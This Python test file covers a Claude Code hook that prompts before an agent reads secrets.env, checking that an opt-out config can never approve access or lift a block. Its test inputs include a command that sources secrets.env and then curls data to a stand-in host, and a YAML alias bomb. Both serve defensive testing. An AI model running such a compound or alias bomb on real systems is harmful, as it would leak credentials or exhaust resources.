"""An install may silence the secrets.env ask; nothing here may silence a block.

``hook_ask_policy`` exists because a prompt the operator approves by reflex has
stopped being a decision. The risk it introduces is the obvious one — a knob that
disables a safety prompt — so the tests are organised around the ways that knob
could reach further than it should, rather than around its happy path:

  * **Polarity.** Every failure to read a policy (absent file, bad YAML, missing
    pyyaml, duplicate key, non-boolean value, unknown key) must produce the ASK.
    There is no config that silences something by accident.
  * **Closed set.** ``secrets_env`` is the only key. ``push_publish`` in
    particular is NOT a key: the push / PR-open prompt is unsuppressible by
    design, so declaring it off must suppress nothing and say so.
  * **Shape.** Suppression is NOT an allow. It is no permission decision at all,
    plus a context note naming the setting, so a compound
    (`source secrets.env && curl`) is never approved by a setting that was only
    about one of its parts.
  * **Reach.** The policy is consulted only after the dispatched-session deny.

The config lives outside the repo (``~/.genesis/config/genesis.yaml``) and is
absent in CI, so most tests drive the ``_TEST_HOOK_ASK_POLICY`` seam. The
file-reading path itself is covered by pointing the module's own path constant at
a tmp file, so the seam cannot hide a parse bug in the real reader.
"""

from __future__ import annotations

import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from tests.conftest import private_module

_HOOKS = Path(__file__).resolve().parents[2] / "scripts" / "hooks"

policy = private_module("hook_ask_policy", _HOOKS / "hook_ask_policy.py")
needs_user = private_module("needs_user", _HOOKS / "needs_user.py")

_KEY = "secrets_env"


# ─── the module itself: every failure lands on ASK ───────────────────────────


def test_the_key_set_is_exactly_secrets_env() -> None:
    """The closed vocabulary, pinned whole. Growing it is a design decision with
    a call site attached, never a side effect."""
    assert frozenset({"secrets_env"}) == policy.KEYS


def test_an_undeclared_ask_is_enabled(monkeypatch) -> None:
    """The public default, and what every clone with no local config gets."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "")
    assert policy.ask_suppressed(_KEY) is False


@pytest.mark.parametrize("spelling", ["off", "false", "no", "OFF", "False", "No"])
def test_every_falsy_spelling_suppresses(monkeypatch, spelling: str) -> None:
    """YAML's own boolean spellings, because the value is the ask's ENABLED
    state — an operator writing `off` must not have to learn a private vocabulary."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"{_KEY}={spelling}")
    assert policy.ask_suppressed(_KEY) is True


@pytest.mark.parametrize("spelling", ["on", "true", "yes", "ON"])
def test_every_truthy_spelling_keeps_the_ask(monkeypatch, spelling: str) -> None:
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"{_KEY}={spelling}")
    assert policy.ask_suppressed(_KEY) is False


@pytest.mark.parametrize("spelling", ["0", "n", "N", "oN", "1", "y"])
def test_the_seam_rejects_what_the_file_rejects(
    monkeypatch, capsys, tmp_path, spelling: str
) -> None:
    """The seam and the file must agree on what a boolean is. PyYAML's SafeLoader
    reads `0` as an int and `n` as a string, so a config file carrying either
    keeps the prompt — and so must the seam. An earlier seam mapped its own
    spelling list and suppressed on `0`/`n`, which let a test validate a
    behaviour no install could configure. Both paths are driven here, against
    the same spelling, so the assertion is the AGREEMENT, not a fixed list."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"{_KEY}={spelling}")
    via_seam = policy.ask_suppressed(_KEY)
    seam_err = capsys.readouterr().err

    path = tmp_path / "genesis.yaml"
    path.write_text(f"hooks:\n  asks:\n    {_KEY}: {spelling}\n")
    monkeypatch.delenv("_TEST_HOOK_ASK_POLICY")
    monkeypatch.setattr(policy, "_CONFIG_PATH", str(path))
    via_file = policy.ask_suppressed(_KEY)
    file_err = capsys.readouterr().err

    assert via_seam is via_file is False
    assert "not a boolean" in seam_err and "not a boolean" in file_err


def test_a_key_outside_the_closed_set_suppresses_nothing(monkeypatch) -> None:
    """There is no wildcard and no `all`. A config naming an ask nobody
    classified is a config that does nothing — which is what stops a future
    settings file from reaching an arm this module has never heard of."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "force_push=off,all=off,merge_gate=off")
    for key in ("force_push", "all", "merge_gate", ""):
        assert policy.ask_suppressed(key) is False
    # And the declared-but-unknown keys did not leak into the classified one.
    assert policy.ask_suppressed(_KEY) is False


def test_push_publish_off_is_an_unknown_key(monkeypatch, capsys) -> None:
    """The push / PR-open prompt is unsuppressible by design. An install that
    copies `push_publish: off` from an older draft of this feature gets NOTHING
    suppressed — not the push prompt (no key), and not the secrets prompt — and
    is told so, in the payload the hook actually delivers."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "push_publish=off")
    assert policy.ask_suppressed("push_publish") is False
    assert policy.ask_suppressed(_KEY) is False
    err = capsys.readouterr().err
    assert "push_publish" in err and "not a prompt this install can turn off" in err
    notes = policy.drain_notes()
    assert notes.startswith("NOTE:") and "push_publish" in notes


def test_push_publish_off_in_the_file_is_an_unknown_key(tmp_path, monkeypatch, capsys) -> None:
    """Same, through the real file reader, alongside a valid key: the valid key
    still works and the push key is still announced as ignored."""
    path = tmp_path / "genesis.yaml"
    path.write_text("hooks:\n  asks:\n    push_publish: off\n    secrets_env: on\n")
    monkeypatch.delenv("_TEST_HOOK_ASK_POLICY", raising=False)
    monkeypatch.setattr(policy, "_CONFIG_PATH", str(path))
    assert policy.ask_suppressed(_KEY) is False
    assert "push_publish" in capsys.readouterr().err


def test_a_non_boolean_value_keeps_the_ask_and_says_so(monkeypatch, capsys) -> None:
    """A declared policy this module cannot honour is announced rather than
    silently replaced — the same treatment `_required_ci_workflows` gives its
    own discarded key, for the same reason."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"{_KEY}=maybe")
    assert policy.ask_suppressed(_KEY) is False
    assert "not a boolean" in capsys.readouterr().err


def test_the_seam_ignores_junk_entries(monkeypatch) -> None:
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"nonsense,=off,{_KEY}=off,   ")
    assert policy.ask_suppressed(_KEY) is True


def test_a_duplicate_seam_key_refuses_to_guess(monkeypatch, capsys) -> None:
    """The file refuses a repeated key; the seam must too, or a test could
    suppress through last-wins, a shape no install can configure."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"{_KEY}=on,{_KEY}=off")
    assert policy.ask_suppressed(_KEY) is False
    assert "more than once" in capsys.readouterr().err


def test_the_seam_is_ignored_outside_a_test_run(monkeypatch, tmp_path) -> None:
    """Outside pytest the seam is inert and the file is the only input, which is
    what makes the documented "FILE-ONLY" true. Here the seam says off, the file
    declares nothing, and with PYTEST_CURRENT_TEST removed the prompt stays."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", f"{_KEY}=off")
    monkeypatch.setattr(policy, "_CONFIG_PATH", str(tmp_path / "absent.yaml"))
    assert policy.ask_suppressed(_KEY) is True  # control: under pytest it binds
    monkeypatch.delenv("PYTEST_CURRENT_TEST")
    assert policy.ask_suppressed(_KEY) is False


# ─── the real reader, driven against a real file ─────────────────────────────


@pytest.fixture
def config_file(monkeypatch, tmp_path):
    """Point the module's config path at a tmp file and clear the seam, so these
    tests exercise the YAML reader rather than the injection shortcut."""
    path = tmp_path / "genesis.yaml"
    monkeypatch.delenv("_TEST_HOOK_ASK_POLICY", raising=False)
    monkeypatch.setattr(policy, "_CONFIG_PATH", str(path))
    return path


def test_a_missing_config_file_is_the_public_default(config_file, capsys) -> None:
    assert not config_file.exists()
    assert policy.ask_suppressed(_KEY) is False
    assert capsys.readouterr().err == ""  # the public default says nothing


def test_a_real_config_file_suppresses(config_file) -> None:
    config_file.write_text("github:\n  user: someone\nhooks:\n  asks:\n    secrets_env: off\n")
    assert policy.ask_suppressed(_KEY) is True


def test_a_missing_file_is_silent_even_without_pyyaml(config_file, capsys, monkeypatch) -> None:
    """A clone with no config declared nothing, so a missing yaml module must
    not produce a "could not be read" NOTE for it."""
    monkeypatch.setitem(sys.modules, "yaml", None)  # import yaml -> ImportError
    assert policy.ask_suppressed(_KEY) is False
    assert capsys.readouterr().err == ""


def test_unparseable_yaml_keeps_the_ask(config_file, capsys) -> None:
    config_file.write_text("hooks:\n  asks:\n   - this is not a mapping\n  : :\n")
    assert policy.ask_suppressed(_KEY) is False
    assert "could not be read" in capsys.readouterr().err


def test_a_duplicate_hooks_section_refuses_to_guess(config_file, capsys) -> None:
    """yaml.safe_load silently keeps the LAST value for a repeated key, so a
    badly-merged config could flip a policy with nothing to show for it.

    Only `hooks:` is doubled here; `asks:` appears once. The duplicate check's
    two clauses are exercised SEPARATELY on purpose — a config that doubles both
    passes on whichever clause still works, so one combined test stays green with
    either half deleted."""
    config_file.write_text("hooks:\n  asks:\n    secrets_env: off\nhooks:\n  other: 1\n")
    assert policy.ask_suppressed(_KEY) is False
    assert "more than" in capsys.readouterr().err


def test_a_duplicate_asks_section_refuses_to_guess(config_file, capsys) -> None:
    """The other clause: one `hooks:`, two `asks:` nested under it."""
    config_file.write_text("hooks:\n  asks:\n    secrets_env: off\n  asks:\n    secrets_env: on\n")
    assert policy.ask_suppressed(_KEY) is False
    assert "more than" in capsys.readouterr().err


def test_a_duplicate_LEAF_key_refuses_to_guess(config_file, capsys) -> None:
    """The likeliest merge accident by far. Two `secrets_env:` lines inside ONE
    `asks:` block: yaml.safe_load keeps the last silently, so a config that
    visibly declares the prompt ON would turn it off. The declared-first value is
    `on`, so a reader of the file would expect the prompt to STAY."""
    config_file.write_text(f"hooks:\n  asks:\n    {_KEY}: on\n    {_KEY}: off\n")
    assert policy.ask_suppressed(_KEY) is False
    err = capsys.readouterr().err
    assert "more than" in err
    assert _KEY in err, "the NOTE must name which key was discarded"


def test_a_QUOTED_duplicate_is_still_a_duplicate(config_file, capsys) -> None:
    """The fail-OPEN direction of a line scan: a quoted key is not recognised,
    one key is counted, YAML keeps the last value, and a config reading `on`
    first turns the prompt OFF. A key's identity is its parsed value, so quoting
    cannot hide it."""
    config_file.write_text(f'hooks:\n  asks:\n    "{_KEY}": on\n    {_KEY}: off\n')
    assert policy.ask_suppressed(_KEY) is False
    assert _KEY in capsys.readouterr().err


@pytest.mark.parametrize(
    "text",
    [
        "hooks:\n  asks:\n    <<: {secrets_env: on, secrets_env: off}\n",
        "hooks:\n  asks:\n    secrets_env: off\n    <<: {secrets_env: on}\n",
        "hooks:\n  asks:\n    <<: [{secrets_env: off}, {secrets_env: on}]\n",
        "hooks:\n  <<: {asks: {secrets_env: off}}\n",
        "<<: {hooks: {asks: {secrets_env: off}}}\n",
    ],
)
def test_a_MERGE_KEY_on_the_path_is_refused(config_file, capsys, text: str) -> None:
    """A merge hides a duplicate, or safe_load's merge precedence overrides the
    value written last. The reader cannot see those rules, so it refuses."""
    config_file.write_text(text)
    assert policy.ask_suppressed(_KEY) is False
    assert "merge" in capsys.readouterr().err


def test_duplicate_SECTIONS_in_the_dangerous_order_are_refused(config_file) -> None:
    """The order that matters: on first, off last (off-then-on passes even with
    no detection, because the last value already keeps the prompt on)."""
    config_file.write_text(
        "hooks:\n  asks:\n    secrets_env: on\nhooks:\n  asks:\n    secrets_env: off\n"
    )
    assert policy.ask_suppressed(_KEY) is False


@pytest.mark.parametrize(
    "unrelated",
    [
        "merge_gate:\n  asks:\n    something: 1\n",
        "other:\n  secrets_env: on\n",
        "other:\n  nested:\n    secrets_env: on\n",
    ],
)
def test_a_same_named_key_in_an_UNRELATED_section_is_not_a_duplicate(
    config_file, capsys, unrelated: str
) -> None:
    """The fail-closed direction of a line scan: an `asks:` or `secrets_env:`
    anywhere else in the file would count as a second declaration and discard
    the install's valid `off`. Only the mappings on hooks -> asks are visited."""
    config_file.write_text(unrelated + "hooks:\n  asks:\n    secrets_env: off\n")
    assert policy.ask_suppressed(_KEY) is True
    assert "more than" not in capsys.readouterr().err


@pytest.mark.parametrize(
    "body", ["off", "false", "0", "[]", '""', "[secrets_env]", '"secrets_env: off"']
)
def test_a_non_mapping_asks_section_keeps_the_ask_and_says_so(config_file, capsys, body) -> None:
    config_file.write_text(f"hooks:\n  asks: {body}\n")
    assert policy.ask_suppressed(_KEY) is False
    assert "not a mapping" in capsys.readouterr().err


@pytest.mark.parametrize("body", ["false", "off", "0", "[]", '""', "[x]", "5"])
def test_a_non_mapping_hooks_section_keeps_the_ask_and_says_so(config_file, capsys, body) -> None:
    """Falsey values included: `or {}` used to read `hooks: false` / `[]` / `0`
    as "declared nothing" and drop the operator's declaration without a word."""
    config_file.write_text(f"hooks: {body}\n")
    assert policy.ask_suppressed(_KEY) is False
    assert "not a mapping" in capsys.readouterr().err


@pytest.mark.parametrize("body", ["false", "0", "[]", '""', "[x]"])
def test_a_non_mapping_config_document_keeps_the_ask_and_says_so(config_file, capsys, body) -> None:
    config_file.write_text(f"{body}\n")
    assert policy.ask_suppressed(_KEY) is False
    assert "not a mapping" in capsys.readouterr().err


@pytest.mark.parametrize(
    "text",
    [
        "",
        "hooks:\n",
        "hooks: null\n",
        "hooks: ~\n",
        "hooks: {}\n",
        "hooks:\n  asks:\n",
        "other: 1\n",
    ],
)
def test_an_empty_file_or_bodiless_hooks_declares_nothing_quietly(
    config_file, capsys, text
) -> None:
    """CONTROL: None (an empty file, a bodiless key) or an absent section is no
    declaration, so there is nothing to report."""
    config_file.write_text(text)
    assert policy.ask_suppressed(_KEY) is False
    assert capsys.readouterr().err == ""


def test_a_bodiless_asks_key_keeps_the_ask(config_file, capsys) -> None:
    """YAML loads a bodiless key as None, not {}."""
    config_file.write_text("hooks:\n  asks:\n")
    assert policy.ask_suppressed(_KEY) is False
    assert capsys.readouterr().err == ""


def test_a_long_malformed_value_is_clipped_in_the_note(config_file, capsys) -> None:
    """The note quotes the value; a whole file must not flood the prompt."""
    config_file.write_text("- " + "x" * 3000 + "\n")
    assert policy.ask_suppressed(_KEY) is False
    err = capsys.readouterr().err
    assert "not a mapping" in err
    assert len(err) < 400


# ─── a declaration that changed nothing must SAY so ─────────────────────────


def test_a_MISSPELLED_key_is_announced_not_silently_ignored(config_file, capsys) -> None:
    config_file.write_text("hooks:\n  asks:\n    secrets_nev: off\n")
    assert policy.ask_suppressed(_KEY) is False
    err = capsys.readouterr().err
    assert "secrets_nev" in err and "not a prompt this install can turn off" in err


def test_a_bodiless_LEAF_is_announced_not_read_as_absent(config_file, capsys) -> None:
    """`secrets_env:` with no value loads as None. That is a key the operator
    DECLARED, so it must not share the silent "absent" branch."""
    config_file.write_text(f"hooks:\n  asks:\n    {_KEY}:\n")
    assert policy.ask_suppressed(_KEY) is False
    err = capsys.readouterr().err
    assert f"hooks.asks.{_KEY}" in err and "not a boolean" in err


def test_an_absent_key_stays_silent(config_file, capsys) -> None:
    """The negative control for the two above: the public default must not
    start emitting NOTEs, or every clone's transcript fills with noise."""
    config_file.write_text("hooks:\n  other: 1\n")
    assert policy.ask_suppressed(_KEY) is False
    assert capsys.readouterr().err == ""


def test_the_note_names_the_setting_and_approves_nothing() -> None:
    """'Off' means stop asking, never stop telling — and never "approved"."""
    reason = policy.suppressed_reason(_KEY, "cat secrets.env")
    assert "hooks.asks.secrets_env" in reason
    assert "cat secrets.env" in reason
    assert "has not approved the command" in reason
    assert "Blocks are unaffected" in reason


# ─── needs_user.decide: no decision when off; the dispatched deny is out of reach


def _hso(doc: dict) -> dict:
    return doc["hookSpecificOutput"]


def _decision(doc: dict) -> str | None:
    """The permission decision, or None when the hook made none."""
    return _hso(doc).get("permissionDecision")


def test_decide_without_a_key_always_asks(monkeypatch) -> None:
    """Existing call sites are unchanged: no key, no policy, no suppression."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "secrets_env=off")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: False)
    assert _decision(needs_user.decide("something", "because")) == "ask"


def test_decide_with_the_key_on_asks(monkeypatch) -> None:
    """Control for the test below: with the key declared ON, the same call asks."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "secrets_env=on")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: False)
    doc = needs_user.decide("access secrets.env", "because", ask_key=_KEY)
    assert _decision(doc) == "ask"


def test_a_suppressed_key_makes_no_decision_and_leaves_a_note(monkeypatch) -> None:
    """Suppression is NOT an allow. The payload carries no permissionDecision
    at all — only additionalContext naming the setting — so Claude Code decides
    the command from its other hooks and its own permission settings."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "secrets_env=off")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: False)
    doc = needs_user.decide("access secrets.env", "because", ask_key=_KEY)
    assert "permissionDecision" not in _hso(doc), doc
    assert "permissionDecisionReason" not in _hso(doc), doc
    assert _hso(doc)["hookEventName"] == "PreToolUse"
    assert "hooks.asks.secrets_env" in _hso(doc)["additionalContext"]


def test_a_suppressed_prompt_still_carries_its_notes(monkeypatch) -> None:
    """The suppression payload is the only channel on that path, so a NOTE
    raised while reading the policy has to ride the additionalContext."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "secrets_env=off,push_publish=off")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: False)
    doc = needs_user.decide("access secrets.env", "because", ask_key=_KEY)
    assert _decision(doc) is None, doc
    ctx = _hso(doc)["additionalContext"]
    assert "hooks.asks.secrets_env" in ctx
    assert "NOTE:" in ctx and "push_publish" in ctx, ctx


def test_a_misconfigured_secrets_policy_says_so_in_the_prompt(monkeypatch) -> None:
    """Claude Code discards an exit-0 hook's stderr, so a NOTE printed only there
    would never be seen. It rides the ask's own reason instead."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "secrets_env=maybe")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: False)
    doc = needs_user.decide("access secrets.env", "because", ask_key=_KEY)
    assert _decision(doc) == "ask"
    reason = _hso(doc)["permissionDecisionReason"]
    assert "NOTE:" in reason and "secrets_env" in reason, reason


def test_push_publish_off_reaches_the_prompt_as_a_note(monkeypatch) -> None:
    """The unknown-key NOTE for `push_publish` is delivered in the secrets
    prompt's own payload, not only on stderr."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "push_publish=off")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: False)
    doc = needs_user.decide("access secrets.env", "because", ask_key=_KEY)
    assert _decision(doc) == "ask"
    reason = _hso(doc)["permissionDecisionReason"]
    assert "NOTE:" in reason and "push_publish" in reason, reason


def test_an_older_needs_user_without_ask_key_still_prompts(monkeypatch) -> None:
    """REVERSE version skew, and the fail direction is the point.

    The secrets guard has no run_guard wrapper and no try/except around main(),
    and a crash exits non-zero — which Claude Code treats as NON-blocking. So an
    uncaught `TypeError: decide() got an unexpected keyword argument 'ask_key'`,
    reachable purely by deploying this file next to an older needs_user.py, would
    let the credentials access through with no prompt, no block and no record.

    The stub here is the old signature exactly — no `ask_key` — so the call
    raises and the retry has to catch it."""
    guard = private_module("secrets_env_access_guard_skew", _HOOKS / "secrets_env_access_guard.py")
    calls: list[dict] = []

    def old_decide(action, reason, detail="", payload=None):
        calls.append({"action": action, "detail": detail})
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": reason,
            }
        }

    monkeypatch.setattr(guard, "decide", old_decide)
    monkeypatch.setattr(guard, "touches_secrets", lambda **kw: True)
    monkeypatch.setattr(
        guard, "read_payload", lambda: {"tool_name": "Bash", "tool_input": {"command": "cat s"}}
    )
    monkeypatch.setattr(guard, "tool_input", lambda p: p.get("tool_input", {}))

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = guard.main()
    assert rc == 0
    assert _decision(json.loads(buf.getvalue())) == "ask", buf.getvalue()
    assert calls, "the retry never reached decide() at all"


def test_a_dispatched_session_is_denied_even_when_the_ask_is_off(monkeypatch) -> None:
    """THE load-bearing test. A dispatched session is denied because nobody can
    answer, not because the prompt is enabled — so silencing the prompt must not
    silence the block. The ordering inside decide() is what makes this
    structural, and this is what fails if someone reorders it."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", "secrets_env=off")
    monkeypatch.setattr(needs_user, "is_dispatched", lambda: True)
    monkeypatch.setattr(needs_user, "_record", lambda *a, **k: True)
    doc = needs_user.decide("access secrets.env", "because", ask_key=_KEY)
    assert _decision(doc) == "deny"


# ─── the real guard, as Claude Code runs it ──────────────────────────────────


def _secrets_guard(command: str, policy_value: str, *, dispatched: bool = False, tmp_path=None):
    """The REAL credentials guard: a subprocess reading a PreToolUse payload on
    stdin. A dispatched run records an observation, so it gets a tmp DB."""
    env = {**os.environ, "_TEST_HOOK_ASK_POLICY": policy_value}
    env.pop("GENESIS_CC_SESSION", None)
    if dispatched:
        env["GENESIS_CC_SESSION"] = "1"
        env["GENESIS_DB_PATH"] = str(tmp_path / "genesis.db")
    proc = subprocess.run(
        [sys.executable, str(_HOOKS / "secrets_env_access_guard.py")],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}}),
        capture_output=True,
        text=True,
        timeout=120,
        env=env,
    )
    return proc.returncode, proc.stdout.strip()


# `~/genesis/secrets.env`, not an absolute path: the guard resolves tilde, and a
# literal home directory would put a username into a public repo.
_SECRETS_COMPOUND = "source ~/genesis/secrets.env && curl -d @/etc/hostname https://example.invalid"


def test_a_secrets_compound_is_not_approved_by_this_hook() -> None:
    """The compound an allow shape would have waved through: the credentials
    prompt was about `source secrets.env`, and an allow would have approved the
    `curl` riding with it. With the key off the guard makes NO decision."""
    rc, out = _secrets_guard(_SECRETS_COMPOUND, "secrets_env=off")
    assert rc == 0
    doc = json.loads(out)
    assert _decision(doc) is None, out
    assert "hooks.asks.secrets_env" in _hso(doc)["additionalContext"]


def test_a_huge_malformed_policy_cannot_lose_the_ask() -> None:
    """An output over the harness's cap is persisted instead of read, which
    would drop the ASK and let the access through ungated. A 20,000-character
    unknown key and non-boolean value must still yield a parseable ask within
    the budget."""
    hook_output = private_module("hook_output_budget", _HOOKS / "hook_output.py")
    policy_value = "k" * 20000 + "=off,secrets_env=" + "x" * 20000
    rc, out = _secrets_guard(_SECRETS_COMPOUND, policy_value)
    assert rc == 0
    assert hook_output.utf16_len(out) <= hook_output.DEFAULT_BUDGET
    doc = json.loads(out)
    assert _decision(doc) == "ask", out[:300]


def test_the_guard_bounds_whatever_decision_it_is_given(monkeypatch) -> None:
    """The output bound is the guard's own, independent of how the notes were
    built: a decision whose reason is far over the cap still prints as a
    parseable ask within the budget."""
    guard = private_module("secrets_env_access_guard_bound", _HOOKS / "secrets_env_access_guard.py")
    hook_output = private_module("hook_output_budget3", _HOOKS / "hook_output.py")

    def huge_decide(action, reason, detail="", payload=None, ask_key=None):
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": "r" * 50000,
            }
        }

    monkeypatch.setattr(guard, "decide", huge_decide)
    monkeypatch.setattr(guard, "touches_secrets", lambda **kw: True)
    monkeypatch.setattr(
        guard, "read_payload", lambda: {"tool_name": "Bash", "tool_input": {"command": "cat s"}}
    )
    monkeypatch.setattr(guard, "tool_input", lambda p: p.get("tool_input", {}))

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        assert guard.main() == 0
    out = buf.getvalue().strip()
    assert hook_output.utf16_len(out) <= hook_output.DEFAULT_BUDGET
    assert _decision(json.loads(out)) == "ask"


def _billion_alias_chain() -> str:
    """Nine levels of ten aliases each: tiny on disk, 10**9 items once expanded."""
    lines = ["l0: &l0 [x, x, x, x, x, x, x, x, x, x]"]
    for i in range(1, 9):
        refs = ", ".join([f"*l{i - 1}"] * 10)
        lines.append(f"l{i}: &l{i} [{refs}]")
    return "\n".join(lines) + "\n"


@pytest.mark.parametrize(
    "config",
    [
        pytest.param("hooks:\n  asks:\n    secrets_env: 0x" + "f" * 5000 + "\n", id="huge-hex-int"),
        pytest.param(
            _billion_alias_chain() + "hooks:\n  asks:\n    secrets_env: *l8\n",
            id="alias-bomb-value",
        ),
        pytest.param(_billion_alias_chain() + "hooks: *l8\n", id="alias-bomb-section"),
    ],
)
def test_a_pathological_value_cannot_crash_or_hang_the_guard(tmp_path, config: str) -> None:
    """The real guard, reading a real config file: describing a malformed value
    for its note must never raise or run past the hook timeout, or the hook
    makes no decision and the access runs unprompted. The ask must survive."""
    home = tmp_path / "home"
    cfg = home / ".genesis" / "config"
    cfg.mkdir(parents=True)
    (cfg / "genesis.yaml").write_text(config)
    env = {
        k: v
        for k, v in os.environ.items()
        if k not in ("_TEST_HOOK_ASK_POLICY", "GENESIS_CC_SESSION")
    }
    env["HOME"] = str(home)
    proc = subprocess.run(
        [sys.executable, str(_HOOKS / "secrets_env_access_guard.py")],
        input=json.dumps(
            {"tool_name": "Bash", "tool_input": {"command": "cat ~/genesis/secrets.env"}}
        ),
        capture_output=True,
        text=True,
        timeout=8,
        env=env,
    )
    assert proc.returncode == 0, (proc.returncode, proc.stderr[-400:])
    assert _decision(json.loads(proc.stdout.strip())) == "ask", proc.stdout[:300]


def test_a_single_merge_key_is_reported_as_a_merge_key(config_file, capsys) -> None:
    config_file.write_text("base: &b {secrets_env: off}\nhooks:\n  asks:\n    <<: *b\n")
    assert policy.ask_suppressed(_KEY) is False
    err = capsys.readouterr().err
    assert "merge key" in err and "more than once" not in err


def test_a_broken_output_helper_still_delivers_the_decision(monkeypatch) -> None:
    """A helper that is present but broken (a syntax error mid-deploy) raises
    something other than ImportError. Uncaught, the guard would exit with no
    decision, which Claude Code does not treat as blocking, so the access would
    run unprompted. The decision must still be printed."""
    import types

    guard = private_module(
        "secrets_env_access_guard_broken", _HOOKS / "secrets_env_access_guard.py"
    )
    broken = types.ModuleType("hook_output")

    def _raise(name):
        raise SyntaxError("simulated broken helper")

    broken.__getattr__ = _raise  # type: ignore[attr-defined]
    monkeypatch.setitem(sys.modules, "hook_output", broken)

    def ask_decide(action, reason, detail="", payload=None, ask_key=None):
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": "credentials",
            }
        }

    monkeypatch.setattr(guard, "decide", ask_decide)
    monkeypatch.setattr(guard, "touches_secrets", lambda **kw: True)
    monkeypatch.setattr(
        guard, "read_payload", lambda: {"tool_name": "Bash", "tool_input": {"command": "cat s"}}
    )
    monkeypatch.setattr(guard, "tool_input", lambda p: p.get("tool_input", {}))

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        assert guard.main() == 0
    assert _decision(json.loads(buf.getvalue().strip())) == "ask"


@pytest.mark.parametrize(
    "seam",
    [
        "k" * 20000 + "=off,secrets_env=" + "x" * 20000,  # unknown key + non-boolean value
        "k" * 20000 + "=on," + "k" * 20000 + "=off",  # duplicate seam key
    ],
)
def test_notes_quote_only_a_clip(monkeypatch, seam) -> None:
    """Layer 1, at its own boundary: a NOTE quotes a clipped key or value,
    never the whole operator-written text, independent of the output bound."""
    monkeypatch.setenv("_TEST_HOOK_ASK_POLICY", seam)
    policy.drain_notes()
    assert policy.ask_suppressed(_KEY) is False
    notes = policy.drain_notes()
    assert notes and len(notes) < 1000, len(notes)


def test_a_huge_command_cannot_lose_the_ask() -> None:
    """The command text reaches the decision too. It is already cut short
    upstream (the guard quotes a bounded subject), so this pins that existing
    cut end to end rather than either layer this change adds."""
    hook_output = private_module("hook_output_budget2", _HOOKS / "hook_output.py")
    command = "cat ~/genesis/secrets.env # " + "y" * 30000
    rc, out = _secrets_guard(command, "")
    assert rc == 0
    assert hook_output.utf16_len(out) <= hook_output.DEFAULT_BUDGET
    assert _decision(json.loads(out)) == "ask"


def test_the_secrets_compound_asks_with_no_policy() -> None:
    """Control: the same command, no policy declared, asks."""
    rc, out = _secrets_guard(_SECRETS_COMPOUND, "")
    assert rc == 0
    assert _decision(json.loads(out)) == "ask", out


def test_the_real_guard_with_push_publish_off_still_asks() -> None:
    """End to end: the push key reaches nothing, and says so in the prompt."""
    rc, out = _secrets_guard(_SECRETS_COMPOUND, "push_publish=off")
    assert rc == 0
    doc = json.loads(out)
    assert _decision(doc) == "ask", out
    assert "push_publish" in _hso(doc)["permissionDecisionReason"]


def test_the_real_guard_still_denies_a_dispatched_session(tmp_path) -> None:
    """End to end through the subprocess: the knob off, a dispatched session,
    and the verdict is still deny."""
    rc, out = _secrets_guard(
        _SECRETS_COMPOUND, "secrets_env=off", dispatched=True, tmp_path=tmp_path
    )
    assert _decision(json.loads(out)) == "deny", (rc, out)


# ─── version skew: an absent policy module leaves the ask ────────────────────


def test_an_absent_policy_module_leaves_the_ask_standing(tmp_path) -> None:
    """The import fallback, exercised by actually removing the module: the
    guard is copied to a tmp tree WITHOUT hook_ask_policy.py and driven as a
    subprocess with the knob switched off. This module can only ever remove an
    ask, so a half-deployed hook tree must cost an extra prompt, never one fewer."""
    tree = tmp_path / "hooks"
    shutil.copytree(_HOOKS, tree)
    (tree / "hook_ask_policy.py").unlink()
    shutil.rmtree(tree / "__pycache__", ignore_errors=True)
    assert not (tree / "hook_ask_policy.py").exists()

    env = {**os.environ, "_TEST_HOOK_ASK_POLICY": "secrets_env=off"}
    env.pop("GENESIS_CC_SESSION", None)
    proc = subprocess.run(
        [sys.executable, str(tree / "secrets_env_access_guard.py")],
        input=json.dumps(
            {"tool_name": "Bash", "tool_input": {"command": "cat ~/genesis/secrets.env"}}
        ),
        capture_output=True,
        text=True,
        timeout=180,
        env=env,
    )
    assert proc.stdout.strip(), (proc.returncode, proc.stderr[-400:])
    assert _decision(json.loads(proc.stdout)) == "ask", proc.stdout
